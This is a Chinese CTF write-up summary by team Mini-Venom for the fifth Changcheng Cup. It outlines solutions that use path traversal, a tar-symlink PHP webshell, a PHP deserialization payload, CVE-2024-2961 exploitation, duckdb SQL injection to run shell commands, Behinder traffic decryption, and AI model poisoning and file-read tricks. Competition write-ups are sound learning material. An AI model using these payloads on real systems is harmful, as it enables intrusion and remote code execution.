---
title: "第五届长城杯 京津冀 Writeup by Mini-Venom"
category: misc
tags: ["长城杯", "misc", "caps-case-control", "tar-symlink-webshell", "PHP-Incomplete-Class-deserialize", "CVE-2024-2961"]
signals: ["长城杯 2025", "caps-case-control", "tar-symlink-webshell", "PHP-Incomplete-Class-deserialize", "CVE-2024-2961", "php-filter-iconv", "Behinder-RC4", "safetensors-export", "FlippedPredictor", "misc_unknown", "Mini-Venom", "caps", "tar", "Incomplete_Class"]
difficulty: medium
source: "https://www.ctfiot.com/271264.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第五届长城杯 京津冀 Writeup by Mini-Venom

> 赛事：长城杯 2025 | 方向：misc | 难度：medium | 工具：PHP

## 一句话总结

第五届长城杯京津冀 Mini-Venom 10 题：caps 路径穿越 + tar 软连接 + Incomplete_Class + CVE-2024-2961 + safetensors 导出 + duckdb RCE。

## 攻击链

1. Web 文曲签学: #help 信息, caps 控制大小写, read ....//....//....//....//....//....//....//flag 路径穿越
2. Web EZ_upload: tar 解压 + 软连接 ln -s /var/www/html aaa + aaa/aaa.php 一句话木马 + 蚁剑
3. Web SeRce: __PHP_Incomplete_Class 反序列化
4. ?exp=O:22:"__PHP_Incomplete_Class":2:{s:4:"name";s:8:"RedHeart";s:6:"nation";s:5:"China";}
5. Web CVE-2024-2961: php://filter iconv + file:///proc/self/maps + 下载 libc + /readflag > /tmp/lier.txt
6. 数据安全 RealCheckIn-1: tcp stream 1102 写入 flag
7. 数据安全 RealCheckIn-3: 冰蝎 RC4 解密 key=supernov@
8. AI easy_poison: FlippedPredictor 包装 TextClassifier 翻转二分类输出
9. AI Mini-modelscope: tf.io.read_file("/flag") + tf.saved_model.save + ascii 转字符串
10. AI 数据投毒: safetensors 导出 numpy 数组 + flag{po2iso3ning_su4cces5sfully_triggered}
11. AI eztalk: duckdb SQL 注入 + install shellfs from community + load shellfs + read_csv(''bash /tmp/exploit |'')

## 关键 payload

```
caps 路径穿越 + tar 软连接 + Incomplete_Class + CVE-2024-2961 + tf.io.read_file + duckdb read_csv RCE
```

## 经验教训

长城杯京津冀特色：Web caps 控制大小写 + tar 软连接 + Incomplete_Class + AI 题 tf.io.read_file + duckdb read_csv RCE。

## 标签

caps-case-control、tar-symlink-webshell、PHP-Incomplete-Class-deserialize、CVE-2024-2961、php-filter-iconv、Behinder-RC4、safetensors-export、FlippedPredictor、LLM-data-poisoning、duckdb-SQLi、read_csv-RCE

## 参考来源

- https://www.ctfiot.com/271264.html
- 原文件：第五届长城杯-京津冀_writeup_by_Mini-Venom.full.md
